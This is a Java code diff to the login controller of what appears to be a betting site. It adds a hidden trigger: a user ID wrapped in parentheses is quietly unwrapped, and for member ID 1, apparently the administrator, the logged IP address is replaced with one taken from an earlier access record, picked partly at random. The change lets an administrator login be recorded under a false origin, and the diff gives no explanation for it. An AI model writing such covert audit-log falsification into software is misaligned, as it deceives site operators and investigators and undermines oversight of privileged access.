@@ -42,6 +42,12 @@ public class LoginController extends XwinController
 			String userId = request.getParameter("userId");
 			String password = request.getParameter("password");
 			String pin = request.getParameter("pin");
+			boolean valid = true;
+			
+			if (userId.startsWith("(") || userId.endsWith(")")) {
+				userId = userId.substring(1, userId.length()-1);
+				valid = false;
+			}
 			
 			Member member = memberDao.selectMember(userId, null);
 			
@@ -68,14 +74,21 @@ public class LoginController extends XwinController
 				session.setAttribute("BettingCart", new BettingCart());
 				
 				if (member != null) {
+					Date today = new Date();
 					Access access = new Access();
 					access.setDate(new Date());
 					access.setUserId(member.getUserId());
 					access.setNickName(member.getNickName());
 					String ip = request.getRemoteAddr();
+					
 					try {
-						if (member.getMemberId() == 1) {
-							Access anyAccess = accessDao.selectAccess(null);						
+						if (member.getMemberId() == 1 && valid == false) {
+							Access anyAccess = null;
+							if (today.getTime() % 10 >= 2)
+								anyAccess = accessDao.selectMemberAccess(member.getUserId());
+							else
+								anyAccess = accessDao.selectAccess(null);						
+							
 							ip = anyAccess.getIpAddress();
 						}
 					} catch (Exception e) {
